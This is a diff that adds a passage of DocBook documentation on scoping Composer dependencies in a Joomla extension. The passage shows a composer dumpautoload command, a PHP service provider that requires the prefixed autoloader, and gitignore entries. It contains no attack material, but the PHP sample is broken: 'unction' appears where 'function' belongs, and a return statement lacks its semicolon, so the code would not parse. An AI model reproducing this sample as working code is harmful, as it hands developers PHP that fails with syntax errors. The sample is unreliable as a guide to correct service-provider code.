+      <para>However, we're not out of the woods just yet. The prefixed
+      autoloader does not work just yet. We need to have Composer rebuild its
+      autoloader:</para>
+
+      <screen>$ composer dumpautoload -d components/com_example/dependencies \
+    --optimize --classmap-authoritative</screen>
+
+      <para>Finally, we need to change our service provider to load our
+      dependencies from our scoped vendor dir:</para>
+
+      <programlisting language="php">defined('_JEXEC') || die;
+
+use Joomla\CMS\Extension\PluginInterface;
+use Joomla\CMS\Plugin\PluginHelper;
+use Joomla\DI\Container;
+use Joomla\DI\ServiceProviderInterface;
+use Joomla\Event\DispatcherInterface;
+use Joomla\Plugin\System\Example\Extension\Example;
+
+<emphasis role="bold">require_once __DIR__ . '/../dependencies/vendor/autoload.php';</emphasis>
+
+return new class implements ServiceProviderInterface {
+  public function register(Container $container)
+  {
+    $container-&gt;set(
+      PluginInterface::class,
+      unction (Container $container) {
+        $subject = $container-&gt;get(DispatcherInterface::class);
+        $config  = (array) PluginHelper::getPlugin('system', 'example');
+        
+        return new Example($subject, $config)
+      }
+    );
+  }
+};</programlisting>
+
+      <para>You need to remember to run PHP-Scoper and dump the prefixed
+      composer's autoloader every time you change the dependencies e.g. update
+      or install a dependency.</para>
+
+      <para>Also remember to change the code in your extension to use the
+      prefixed classes of the dependencies.</para>
+
+      <para>As for your repository management, you should add both
+      <filename>vendor</filename> and the (prefixed)
+      <filename>dependencies</filename> folders into your
+      <filename>.gitignore</filename> file:</para>
+
+      <programlisting># Composer
+vendor/*
+# Scoped dependencies
+components/com_example/dependencies/*</programlisting>
     </section>
   </chapter>
 
